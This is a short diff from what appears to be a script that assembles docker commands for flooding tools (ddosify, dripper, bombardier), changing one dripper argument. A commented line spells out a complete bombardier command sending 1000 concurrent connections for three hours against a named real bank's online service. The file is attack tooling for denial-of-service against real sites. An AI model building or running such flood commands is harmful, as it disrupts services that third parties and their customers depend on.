@@ -41,7 +41,7 @@ ddosify3 = " -m PUT -T " + timeout
 
 dripper1 = const_part1 + "alexmon1989/dripper:1.0.1 -s "
 dripper2 = " -p "
-dripper3 = " -t " + duration
+dripper3 = " -t " + requests
 
 
 # # "docker run -ti --rm alpine/bombardier -c 1000 -d 10800s -l https://online.sberbank.ru/"
